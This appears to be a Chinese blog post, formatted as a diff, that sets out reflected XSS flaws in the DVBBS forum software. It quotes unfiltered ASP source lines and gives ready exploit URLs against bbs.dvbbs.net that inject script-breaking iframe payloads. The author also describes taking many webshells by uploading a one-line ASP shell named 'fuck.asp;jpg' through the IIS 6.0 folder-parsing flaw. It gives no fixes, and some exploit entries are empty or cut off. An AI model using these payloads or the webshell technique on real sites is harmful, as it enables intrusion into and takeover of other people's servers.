@@ -1,0 +1,124 @@
+无意间看下自己的访问来源
+
+发现好多网友在找这个东西
+
+动网论坛(DVBBS)usersms.asp页面过滤不严导致跨站漏洞
+
+其实这个东西危害不是很大 个人感觉 不如直接拿webshell来的直接
+
+8。1-2中有个利用IIS6.0文件夹解析的漏洞 注册用户然后 打开个人空间 个人
+
+文件里边上穿图片格式的一句话 文件名fuck.asp;jpg
+
+然后看路径直接连接 就搞定这个用这个漏洞拿了不少webshell
+
+漏洞分析:
+
+文件usersms.asp中：
+
+Function ShowPage(CurrentPage,Pcount,totalrec,PageNum) //第175行
+
+Dim SearchStr
+
+SearchStr = "action="&Request("action")
+
+ShowPage = template.html(16)
+
+ShowPage = Replace(ShowPage,"{$colSpan}",6)
+
+ShowPage = Replace(ShowPage,"{$CurrentPage}",CurrentPage)
+
+ShowPage = Replace(ShowPage,"{$Pcount}",Pcount)
+
+ShowPage = Replace(ShowPage,"{$PageNum}",PageNum)
+
+ShowPage = Replace(ShowPage,"{$totalrec}",totalrec)
+
+ShowPage = Replace(ShowPage,"{$SearchStr}",SearchStr)
+
+程序没有对输出变量SearchStr过滤导致xss漏洞的产生。
+
+动网论坛(DVBBS)Favlist.asp页面过滤不严导致跨站漏洞
+
+
+漏洞分析:
+
+文件favlist.asp中：
+
+Function ShowPage(CurrentPage,Pcount,totalrec,PageNum) //第227行
+
+Dim SearchStr
+
+SearchStr=Request("action")
+
+……
+
+ShowPage=Replace(ShowPage,"{$SearchStr}",SearchStr) //第236行
+
+ShowPage=Replace(ShowPage,"{$redcolor}",Dvbbs.mainsetting(1))
+
+程序没有对输出变量SearchStr过滤导致xss漏洞的产生。
+
+
+漏洞利用:
+
+http://bbs.dvbbs.net/favlist.asp?action=xxx');//-->%3C/script%3E<iframe%20src=http://www.baidu.com></iframe>
+
+动网论坛(DVBBS)Boardhelp.asp页面过滤不严导致跨站漏洞(可滤过 这个我没执行成功)
+
+
+漏洞分析:
+
+文件Boardhelp.asp中：
+
+Helptitle=Request("title") //第22行
+
+……
+
+TempHelp=Replace(TempHelp,"{$Title}",Helptitle) //第51行
+
+程序对于输出的变量Helptitle没有过滤导致xss漏洞的产生。
+
+漏洞利用:
+
+>
+
+动网论坛(DVBBS)Show.asp页面过滤不严导致跨站漏洞
+
+
+漏洞分析:
+
+文件show.asp中：
+
+filetype=Request("filetype") //第75行
+
+username=Request("username")
+
+……
+
+TempStr = Replace(TempStr,"{$username}",UserName) //第244行
+
+程序对于输出变量filetype和username过滤导致xss漏洞的产生。
+
+漏洞利用:
+
+>
+
+动网论坛(DVBBS)Smiley.asp页面过滤不严导致跨站漏洞
+
+
+漏洞分析:
+
+文件smiley.asp中：
+
+If Request("star")<>"" Then //第13行
+
+star=Request("star")
+
+……
+
+Response.Write "var star="&star&"; //第87行
+
+程序没有对输出变量star过滤导致xss漏洞的产生。
+
+漏洞利用: http://bbs.dvbbs.net/smiley.asp?star=xxx');//-->%3C/script%3E<iframe%20src=http://www.baidu.com></iframe>
